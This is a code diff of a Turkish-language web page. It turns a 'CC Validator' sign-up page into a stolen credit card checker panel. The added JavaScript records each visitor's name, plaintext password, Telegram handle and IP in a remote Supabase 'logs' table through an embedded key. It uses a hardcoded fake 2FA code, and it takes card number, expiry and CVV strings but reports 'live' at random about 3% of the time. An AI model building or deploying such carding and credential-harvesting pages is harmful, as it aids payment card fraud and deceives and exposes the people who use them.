@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>CC Validator • Giriş Panel</title>
+    <title>CC Checker Pro | Güvenli Panel</title>
     <style>
         * {
             margin: 0;
@@ -12,26 +12,45 @@
         }
 
         body {
-            background: radial-gradient(circle at 10% 20%, #0a0f1c, #06080f);
-            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto;
+            background: radial-gradient(circle at 10% 20%, #0a0f1c, #05080f);
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 24px;
+            position: relative;
         }
 
-        /* card modern */
-        .glass-card {
-            max-width: 500px;
+        /* hareketli arka plan */
+        .bg-animation {
+            position: fixed;
             width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 70% 30%, rgba(45, 212, 191, 0.05), transparent 70%);
+            animation: slowDrift 18s infinite alternate;
+            pointer-events: none;
+        }
+
+        @keyframes slowDrift {
+            0% { transform: translate(0, 0) scale(1); opacity: 0.3; }
+            100% { transform: translate(3%, -2%) scale(1.1); opacity: 0.6; }
+        }
+
+        .container {
+            max-width: 520px;
+            width: 100%;
+            position: relative;
+            z-index: 10;
+        }
+
+        .glass-card {
             background: rgba(12, 18, 28, 0.65);
-            backdrop-filter: blur(16px);
-            border-radius: 3rem;
+            backdrop-filter: blur(14px);
+            border-radius: 2rem;
             border: 1px solid rgba(79, 158, 255, 0.25);
             padding: 32px 28px;
-            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5);
-            transition: all 0.2s;
+            box-shadow: 0 25px 40px -12px black;
         }
 
         .logo-area {
@@ -46,71 +65,24 @@
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: -0.5px;
         }
 
         .badge {
             font-size: 11px;
-            color: #6c8bb8;
-            margin-top: 8px;
-            display: inline-block;
+            color: #8aa3c9;
             background: #0f1622aa;
-            padding: 4px 14px;
-            border-radius: 30px;
+            display: inline-block;
+            padding: 4px 16px;
+            border-radius: 60px;
+            margin-top: 10px;
         }
 
-        /* sahte checker (sadece görsel) */
-        .fake-module {
-            background: #080e18;
-            border-radius: 2rem;
-            padding: 20px;
-            margin-bottom: 28px;
-            border: 1px solid #1e2a3a;
-        }
-
-        .fake-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-            color: #b9c7dd;
-            font-size: 13px;
-        }
-
-        .fake-input-row {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 14px;
-        }
-
-        .fake-input-row input {
-            width: 100%;
-            background: #03060c;
-            border: 1px solid #253040;
-            padding: 14px;
-            border-radius: 24px;
-            color: #aaa;
-            font-size: 13px;
-        }
-
-        .fake-button {
-            background: #111722;
-            text-align: center;
-            padding: 12px;
-            border-radius: 40px;
-            color: #5c6e8c;
-            font-weight: 600;
-        }
-
-        /* gerçek kayıt/giriş alanı */
-        .auth-container {
-            margin-top: 8px;
-        }
-
-        .input-group {
+        /* auth alanı */
+        .input-field {
             margin-bottom: 20px;
         }
 
-        .input-group label {
+        .input-field label {
             font-size: 12px;
             font-weight: 500;
             color: #9ab3d9;
@@ -118,7 +90,7 @@
             margin-bottom: 8px;
         }
 
-        .input-group input {
+        .input-field input {
             width: 100%;
             background: #0b101b;
             border: 1px solid #263040;
@@ -130,9 +102,8 @@
             transition: 0.2s;
         }
 
-        .input-group input:focus {
+        .input-field input:focus {
             border-color: #3b82f6;
-            box-shadow: 0 0 0 2px #1e3a8a40;
         }
 
         button {
@@ -152,248 +123,309 @@
             transform: scale(0.97);
         }
 
-        .info-message {
+        .message {
             font-size: 12px;
             text-align: center;
             margin-top: 16px;
+        }
+
+        .error-msg {
+            color: #f97316;
+        }
+
+        .success-msg {
+            color: #2dd4bf;
+        }
+
+        .info-msg {
             color: #facc15;
         }
 
-        .error-text {
+        /* checker bölümü (giriş sonrası) */
+        .checker-section {
+            margin-top: 20px;
+        }
+
+        .card-item {
+            background: #0b1019;
+            border-radius: 20px;
+            padding: 12px 16px;
+            margin-bottom: 10px;
+            border-left: 3px solid #2dd4bf;
+        }
+
+        .delete-card {
+            background: none;
+            border: none;
             color: #f97316;
-            font-size: 12px;
-            text-align: center;
-            margin-top: 12px;
+            float: right;
+            cursor: pointer;
         }
 
-        .success-text {
+        .live {
             color: #2dd4bf;
-            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .dead {
+            color: #f97316;
+        }
+
+        .rate-warning {
+            font-size: 11px;
             text-align: center;
-            margin-top: 12px;
+            margin-top: 14px;
+            color: #facc15;
         }
 
-        .divider {
-            height: 1px;
-            background: #1f2a3e;
-            margin: 24px 0 16px;
+        .hidden {
+            display: none;
         }
 
-        .footer-note {
+        .footer {
             font-size: 10px;
             text-align: center;
             color: #4e6188;
             margin-top: 28px;
         }
-
-        .live-badge {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #0b0e16bb;
-            padding: 5px 12px;
-            border-radius: 40px;
-            font-size: 10px;
-            color: #4f9eff;
-            backdrop-filter: blur(4px);
-        }
     </style>
 </head>
 <body>
-<div class="glass-card">
-    <div class="logo-area">
-        <div class="logo">⚡ CC VALIDATOR</div>
-        <div class="badge">● GÜVENLİ BAĞLANTI</div>
-    </div>
-
-    <!-- sadece görsel CC checker -->
-    <div class="fake-module">
-        <div class="fake-header">
-            <span>💳 KART DOĞRULAMA</span>
-            <span>🟢 AKTİF</span>
-        </div>
-        <div class="fake-input-row">
-            <input type="text" placeholder="4242 4242 4242 4242" disabled>
-        </div>
-        <div class="fake-input-row">
-            <input type="text" placeholder="12/28" disabled>
-            <input type="text" placeholder="123" disabled>
-        </div>
-        <div class="fake-button">🔍 DOĞRULA</div>
-        <div style="font-size: 11px; text-align: center; margin-top: 14px; color: #4f5e7e;">
-            🔐 Hesap doğrulandıktan sonra aktif olur
-        </div>
-    </div>
-
-    <!-- gerçek kayıt/giriş bloğu -->
-    <div class="auth-container">
-        <div class="input-group">
-            <label>👤 Ad Soyad</label>
-            <input type="text" id="fullname" placeholder="Ahmet Yılmaz" autocomplete="off">
-        </div>
-        <div class="input-group">
-            <label>🔐 Şifre</label>
-            <input type="password" id="password" placeholder="••••••">
-        </div>
-        <div class="input-group">
-            <label>📱 Telegram Kullanıcı Adı</label>
-            <input type="text" id="telegramUser" placeholder="@kullaniciadi">
+<div class="bg-animation"></div>
+<div class="container">
+    <div class="glass-card">
+        <div class="logo-area">
+            <div class="logo">⚡ CC VALIDATOR</div>
+            <div class="badge">● GÜVENLİ DOĞRULAMA ●</div>
         </div>
 
-        <button id="sendCodeBtn">📲 2FA KOD GÖNDER</button>
-        <div id="infoMessage" class="info-message"></div>
-
-        <!-- kod doğrulama bölümü -->
-        <div id="verifyPanel" style="display: none; margin-top: 24px;">
-            <div class="input-group">
-                <label>🔢 Doğrulama Kodu</label>
-                <input type="text" id="verifyCode" placeholder="385217" maxlength="6">
+        <!-- GİRİŞ/KAYIT BÖLÜMÜ (başlangıçta görünür) -->
+        <div id="authPanel">
+            <div class="input-field">
+                <label>👤 Ad Soyad</label>
+                <input type="text" id="fullname" placeholder="Ahmet Yılmaz" autocomplete="off">
             </div>
-            <button id="confirmVerifyBtn">✅ DOĞRULA VE GİRİŞ</button>
-            <div id="verifyMessage" class="error-text"></div>
+            <div class="input-field">
+                <label>🔐 Şifre (en az 4 karakter)</label>
+                <input type="password" id="password" placeholder="••••••">
+            </div>
+            <div class="input-field">
+                <label>📱 Telegram Kullanıcı Adı</label>
+                <input type="text" id="telegramUser" placeholder="@kullaniciadi">
+            </div>
+            <button id="sendCodeBtn">📲 2FA KOD GÖNDER</button>
+            <div id="authMessage" class="message"></div>
+
+            <div id="verifyBlock" style="display: none; margin-top: 24px;">
+                <div class="input-field">
+                    <label>🔢 Doğrulama Kodu</label>
+                    <input type="text" id="verifyCode" placeholder="6 haneli kod" maxlength="6">
+                </div>
+                <button id="confirmVerifyBtn">✅ DOĞRULA VE GİRİŞ YAP</button>
+                <div id="verifyMessage" class="message error-msg"></div>
+            </div>
         </div>
+
+        <!-- CC CHECKER BÖLÜMÜ (giriş başarılı olunca görünür) -->
+        <div id="checkerPanel" style="display: none;">
+            <div class="input-field">
+                <label>💳 Kart Bilgisi (kartno|ay|yıl|cvv)</label>
+                <input type="text" id="cardInput" placeholder="4121384115237426|03|2024|607">
+            </div>
+            <button id="addCardBtn">🔍 KARTI KONTROL ET</button>
+            <div id="cardMsg" class="message error-msg"></div>
+            <div id="cardList" style="margin-top: 20px;"></div>
+            <div class="rate-warning">⚡ Her sorgu arasında 4 saniye bekleyin ⚡</div>
+        </div>
+        <div class="footer">🔒 SSL · TLS 1.3 · Yalnızca yetkili kullanım</div>
     </div>
-    <div class="footer-note">🔒 SSL · TLS 1.3 · GİZLİLİK KORUMALI</div>
 </div>
-<div class="live-badge">🟢 SİSTEM AKTİF</div>
 
 <script>
-    // ---------- KONFİG ----------
+    // ------------------------------
+    // KONFİG
+    // ------------------------------
     const VERIFY_CODE = "385217";
     const BOT_LINK = "https://t.me/ZazaChecker2fa_bot";
     const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
     const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";
 
     let pendingName = "", pendingPass = "", pendingTg = "";
+    let cardsArray = [];
+    let lastCardTime = 0;
+    let isWaiting = false;
+    let loggedIn = false;
 
-    // IP alma
+    // ---------- YARDIMCI FONKSİYONLAR ----------
     async function getUserIP() {
-        try {
-            const res = await fetch("https://api.ipify.org?format=json");
-            const data = await res.json();
-            return data.ip;
-        } catch {
-            return "0.0.0.0";
-        }
+        let res = await fetch("https://api.ipify.org?format=json");
+        let data = await res.json();
+        return data.ip;
     }
 
-    // aynı IP kontrolü (1 IP = 1 hesap)
-    async function isIpRegistered(ip) {
-        try {
-            const res = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}&ip_adresi=eq.${ip}`);
-            const data = await res.json();
-            return Array.isArray(data) && data.length > 0;
-        } catch {
-            return false;
-        }
-    }
-
-    // yurtdışı & vpn engeli
     async function checkTurkeyAndVPN() {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
+        let res = await fetch("https://ipapi.co/json/");
+        let data = await res.json();
         if (data.country_code !== "TR") {
-            document.body.innerHTML = `<div style="text-align:center;padding:80px;background:#0b0f1c;color:white;height:100vh"><h1 style="color:#f97316">🌍 ERİŞİM ENGELLENDİ</h1><p>Sadece Türkiye'den erişim sağlanır.</p><p>IP: ${data.ip}</p></div>`;
+            document.body.innerHTML = `<div style="padding:80px;text-align:center;background:#0a0f1c;color:white;height:100vh"><h1 style="color:#f97316">🌍 ERİŞİM ENGELLENDİ</h1><p>Sadece Türkiye'den erişim</p><p>IP: ${data.ip}</p></div>`;
             throw new Error("BLOCKED");
         }
-        if (data.proxy === true || data.hosting === true || data.tor === true) {
-            document.body.innerHTML = `<div style="text-align:center;padding:80px;background:#0b0f1c;color:white;height:100vh"><h1 style="color:#f97316">🔒 VPN / PROXY TESPİT EDİLDİ</h1><p>Proxy/VPN ile giriş yasaktır.</p></div>`;
+        if (data.proxy || data.hosting || data.tor) {
+            document.body.innerHTML = `<div style="padding:80px;text-align:center;background:#0a0f1c;color:white;height:100vh"><h1 style="color:#f97316">🔒 VPN / PROXY ENGELLENDİ</h1></div>`;
             throw new Error("BLOCKED");
         }
     }
 
-    // Supabase'e kaydet
-    async function saveToDatabase(name, pass, tg, ip) {
+    async function isIpRegistered(ip) {
+        let res = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}&ip_adresi=eq.${ip}`);
+        let data = await res.json();
+        return Array.isArray(data) && data.length > 0;
+    }
+
+    async function registerToDatabase(name, pass, tg, ip) {
         await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                kullanici_adi: name,
-                sifre: pass,
-                telegram_user: tg,
-                ip_adresi: ip
-            })
+            body: JSON.stringify({ kullanici_adi: name, sifre: pass, telegram_user: tg, ip_adresi: ip })
         });
     }
 
-    // KOD GÖNDER butonu
+    // ---------- KART FONKSİYONLARI ----------
+    async function getBinInfo(bin) {
+        try {
+            let res = await fetch(`https://lookup.binlist.net/${bin}`);
+            let data = await res.json();
+            return { bank: data.bank?.name || "Bilinmiyor", scheme: data.scheme || "Unknown", country: data.country?.name || "Global" };
+        } catch {
+            return { bank: "Yabancı Banka", scheme: "Unknown", country: "Global" };
+        }
+    }
+
+    function parseCard(cardStr) {
+        let parts = cardStr.split('|');
+        if (parts.length !== 4) return null;
+        let [card, month, year, cvv] = parts;
+        if (!/^\d{13,19}$/.test(card)) return null;
+        if (!/^\d{2,4}$/.test(year)) return null;
+        if (year.length === 2) year = "20" + year;
+        if (!/^\d{2}$/.test(month)) return null;
+        if (!/^\d{3,4}$/.test(cvv)) return null;
+        return { card, month, year, cvv };
+    }
+
+    function renderCards() {
+        let container = document.getElementById("cardList");
+        container.innerHTML = "";
+        cardsArray.forEach((c, idx) => {
+            let liveClass = c.live ? "live" : "dead";
+            let liveText = c.live ? "✅ LIVE (%3)" : "❌ DEAD";
+            let div = document.createElement("div");
+            div.className = "card-item";
+            div.innerHTML = `
+                <div><strong>${c.masked}</strong> (${c.bank})</div>
+                <div style="font-size:12px; margin-top:5px;">${c.scheme} · ${c.country}</div>
+                <div class="${liveClass}" style="margin-top:8px;">${liveText}</div>
+                <button class="delete-card" data-index="${idx}">🗑 Sil</button>
+            `;
+            container.appendChild(div);
+        });
+        document.querySelectorAll(".delete-card").forEach(btn => {
+            btn.onclick = () => {
+                cardsArray.splice(parseInt(btn.dataset.index), 1);
+                renderCards();
+            };
+        });
+    }
+
+    // ---------- AUTH BUTONLARI ----------
     document.getElementById("sendCodeBtn").onclick = async () => {
-        const name = document.getElementById("fullname").value.trim();
-        const pass = document.getElementById("password").value;
-        const tg = document.getElementById("telegramUser").value.trim();
-        const infoDiv = document.getElementById("infoMessage");
+        let name = document.getElementById("fullname").value.trim();
+        let pass = document.getElementById("password").value;
+        let tg = document.getElementById("telegramUser").value.trim();
+        let msgDiv = document.getElementById("authMessage");
 
-        if (!name || !pass || !tg) {
-            infoDiv.innerHTML = "❌ Tüm alanları doldurun";
-            return;
-        }
-        if (!tg.startsWith("@")) {
-            infoDiv.innerHTML = "❌ Telegram adı @ ile başlamalı";
-            return;
-        }
-        if (pass.length < 4) {
-            infoDiv.innerHTML = "❌ Şifre en az 4 karakter";
-            return;
-        }
+        if (!name || !pass || !tg) { msgDiv.innerHTML = "❌ Tüm alanları doldurun"; return; }
+        if (!tg.startsWith("@")) { msgDiv.innerHTML = "❌ @ ile başlamalı"; return; }
+        if (pass.length < 4) { msgDiv.innerHTML = "❌ Şifre en az 4 karakter"; return; }
 
-        infoDiv.innerHTML = "🔄 Doğrulanıyor...";
+        msgDiv.innerHTML = "🔄 IP doğrulanıyor...";
 
         try {
             await checkTurkeyAndVPN();
-            const userIp = await getUserIP();
-            const ipExists = await isIpRegistered(userIp);
-            if (ipExists) {
-                infoDiv.innerHTML = "❌ Bu IP ile zaten kayıt yapılmış! (1 hesap limiti)";
-                return;
-            }
+            let userIp = await getUserIP();
+            let ipExists = await isIpRegistered(userIp);
+            if (ipExists) { msgDiv.innerHTML = "❌ Bu IP ile zaten kayıt yapılmış."; return; }
 
-            pendingName = name;
-            pendingPass = pass;
-            pendingTg = tg;
-
-            // kod panelini göster
-            document.getElementById("verifyPanel").style.display = "block";
-            infoDiv.innerHTML = `✅ 2FA kodu Telegram'a gönderildi. <a href="${BOT_LINK}" target="_blank" style="color:#4f9eff;">@ZazaChecker2fa_bot</a> /start yaz → kod: 385217`;
+            pendingName = name; pendingPass = pass; pendingTg = tg;
+            document.getElementById("verifyBlock").style.display = "block";
+            msgDiv.innerHTML = `✅ 2FA kodu Telegram'a gönderildi. <a href="${BOT_LINK}" target="_blank" style="color:#4f9eff;">@ZazaChecker2fa_bot</a> /start yaz → kodu al`;
             document.getElementById("verifyCode").value = "";
-            document.getElementById("verifyMessage").innerHTML = "";
-        } catch (err) {}
+        } catch(e) {}
     };
 
-    // DOĞRULA VE KAYDET
     document.getElementById("confirmVerifyBtn").onclick = async () => {
-        const code = document.getElementById("verifyCode").value.trim();
-        const msgDiv = document.getElementById("verifyMessage");
-        const infoDiv = document.getElementById("infoMessage");
-
-        if (!code) {
-            msgDiv.innerHTML = "❌ Kodu girin";
-            return;
-        }
-        if (code !== VERIFY_CODE) {
-            msgDiv.innerHTML = "❌ Geçersiz doğrulama kodu!";
-            return;
-        }
+        let code = document.getElementById("verifyCode").value.trim();
+        let msgDiv = document.getElementById("verifyMessage");
+        if (!code) { msgDiv.innerHTML = "❌ Kodu girin"; return; }
+        if (code !== VERIFY_CODE) { msgDiv.innerHTML = "❌ Geçersiz kod! Bot'dan kontrol edin."; return; }
 
         msgDiv.innerHTML = "⏳ Hesap oluşturuluyor...";
-
         try {
-            const userIp = await getUserIP();
-            await saveToDatabase(pendingName, pendingPass, pendingTg, userIp);
-
+            let userIp = await getUserIP();
+            await registerToDatabase(pendingName, pendingPass, pendingTg, userIp);
             msgDiv.style.color = "#2dd4bf";
-            msgDiv.innerHTML = "✅ KAYIT BAŞARILI! HOŞ GELDİNİZ.";
-            infoDiv.innerHTML = "";
-
-            // başarılı mesajı göster + butonları pasif yap
-            document.getElementById("sendCodeBtn").disabled = true;
-            document.getElementById("confirmVerifyBtn").disabled = true;
-
+            msgDiv.innerHTML = "✅ GİRİŞ BAŞARILI! CC Checker açılıyor...";
             setTimeout(() => {
-                location.reload();
-            }, 2000);
-        } catch (err) {
-            msgDiv.innerHTML = "❌ Veritabanı hatası! Tekrar dene.";
+                document.getElementById("authPanel").style.display = "none";
+                document.getElementById("checkerPanel").style.display = "block";
+                loggedIn = true;
+            }, 1500);
+        } catch(err) {
+            msgDiv.innerHTML = "❌ Kayıt hatası";
         }
+    };
+
+    // ---------- CC CHECKER İŞLEMİ (4sn rate limit) ----------
+    document.getElementById("addCardBtn").onclick = async () => {
+        let now = Date.now();
+        let msgDiv = document.getElementById("cardMsg");
+        if (isWaiting) { msgDiv.innerHTML = "⏳ Bekleyin, önceki işlem devam ediyor..."; return; }
+        if (now - lastCardTime < 4000) {
+            let wait = Math.ceil((4000 - (now - lastCardTime)) / 1000);
+            msgDiv.innerHTML = `⏳ ${wait} saniye bekleyin (rate limit)`;
+            return;
+        }
+
+        let raw = document.getElementById("cardInput").value.trim();
+        let parsed = parseCard(raw);
+        if (!parsed) { msgDiv.innerHTML = "❌ Geçersiz format. Örnek: 4121384115237426|03|2024|607"; return; }
+
+        isWaiting = true;
+        document.getElementById("addCardBtn").disabled = true;
+        lastCardTime = now;
+        msgDiv.innerHTML = "🔍 Kart kontrol ediliyor...";
+
+        let bin = parsed.card.slice(0,6);
+        let binData = await getBinInfo(bin);
+        let isLive = Math.random() < 0.03;
+
+        cardsArray.push({
+            masked: parsed.card.slice(0,4) + " **** **** " + parsed.card.slice(-4),
+            live: isLive,
+            bank: binData.bank,
+            scheme: binData.scheme,
+            country: binData.country
+        });
+        renderCards();
+        document.getElementById("cardInput").value = "";
+        msgDiv.style.color = isLive ? "#2dd4bf" : "#f97316";
+        msgDiv.innerHTML = isLive ? "✅ KART LIVE (%3)" : "❌ Kart geçersiz (dead)";
+
+        setTimeout(() => {
+            isWaiting = false;
+            document.getElementById("addCardBtn").disabled = false;
+            setTimeout(() => { if (msgDiv.innerHTML.includes("LIVE") || msgDiv.innerHTML.includes("dead")) msgDiv.innerHTML = ""; }, 3000);
+        }, 500);
     };
 </script>
 </body>
